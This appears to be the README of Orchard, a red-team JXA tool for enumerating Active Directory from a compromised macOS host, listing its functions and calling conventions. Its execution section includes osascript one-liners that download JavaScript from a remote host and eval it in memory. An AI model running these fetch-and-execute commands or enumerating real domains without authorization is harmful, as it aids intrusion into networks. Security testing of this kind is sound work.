# Orchard
JavaScript for Automation (JXA) tool to do Active Directory enumeration.

# Purpose
Live off the land for macOS. This program allows users to do Active Directory enumeration via macOS' JXA (JavaScript for Automation) code. This is the newest version of AppleScript, and thus has very poor documentation on the web. 

# Execution
Host the Orchard.js code somewhere you can access and pull it into a scripting session like so:
```JavaScript
testmac: ~$ osascript -l JavaScript -i
>> eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('http://192.168.56.1:8080/Orchard.js')),$.NSUTF8StringEncoding)));
=> true
>> Get_CurrentDomain();
=> "test.local"
>>
```
This requires the user to already have execution on the machine. Additionally, the capitalization for JavaScript in the first command is extremely important. **All of JXA is case sensitive.** The second line does an HTTP GET request for Orchard.js and loads the functions into the current session. If you just want to execute a single line (if there's only one function you want to execute for example) you can do the following instead:
```JavaScript
testmac: ~$ osascript -l JavaScript -e "eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('http://192.168.56.1:8080/Orchard.js')),$.NSUTF8StringEncoding))); Get_CurrentDomain();"
```

## Execution Methods
All of the commands provide an API parameter. Right now they all default to *false* and changing them to *true* won't do anything. My first goal was to get everything implemented using the native macOS binaries, then I will go back and start implementing the same techniques using the Objective-C bridge to leverage API calls.

This means that every command does the following: `currApp.doShellScript(command);`. This will execute the necessary shell commands to accomplish the function goals. **Note:** From my testing, this doesn't spawn a Terminal.app window, but I make no guarantees.

## Calling a Function
After you've imported the Orchard.js code into your current session, you can call any of the functions with a slight tweak to normal JavaScript function calls. I wanted to make the code a bit more python-esque, so I modified the calling convention. You'll see functions defined as:

`function ConvertTo_SID({API=false, object=".\\root", type="Users} = {}) { code here; }`. This allows me to provide default values (if desired) to each function parameter as well as preventing them from being positional arguments like standard function calls. To call this function, simply do any of the following:
```JavaScript
ConvertTo_SID(); //Uses all of the default values to call the function
ConvertTo_SID({object:"TEST\\Domain Admins", type:"Groups"}); //leaves API as false, but sets object and type
ConvertTo_SID({type:"Groups",object:"TEST\\Domain Admins"}); //same as above - the order of the arguments doesn't matter
```
**Note1:** In defining a function this way, it's "name=value", but when calling the function it's "name:value". It's a little odd, I know, but you're most likely going to be just calling functions anyway.

**Note2:** Every function has a Help flag that can be used to get information about how to run the function

# Functions
| Function | Version Introduced | Description|
| ---------|:------------------|:-----------|
| ConvertTo_SID |1.0 |Convert Users, Groups, Or Computers to domain or local SIDs |
| ConvertFrom_SID |1.0 |Convert Users, Groups, or Computers from SIDs to names |
| Get_PathAcl |1.0 |Get linux and mac specific ACLs on a file or folder |
| Get_PathXattr |1.0 |Get mac specific extended attributes on a file or folder |
| Get_MountedVolumes |1.0 |Get the mounted volumes on the current computer |
| Set_MountVolume |1.0 |Mount a remote share on the current computer |
| Get_DomainUser |1.0 |List all domain users or get information on a specific user |
| Get_DomainComputer |1.0 |List all domain computers or get information on a specific computer |
| Get_LDAPSearch |1.0 |Execute a customized LDAP search query |
| Get_DomainOU |1.0 |List all domain organizational units or get information on a specific unit |
| Get_DomainSID |1.0 |Gets the SID of the domain by truncating the SID for the "Domain Admins" group |
| Get_DomainGroup |1.0 |List all domain groups or get information on a specific group |
| Get_DomainGroupMember |1.0 |Get all the members of a specific domain group |
| Get_CurrentDomain |1.0 |Get the fully qualified current domain |
| Get_CurrentNETBIOSDomain |1.0 |Get the NETBIOS name of the current domain |
| Get_Forest |1.0 |Get the fully qualified forest name |
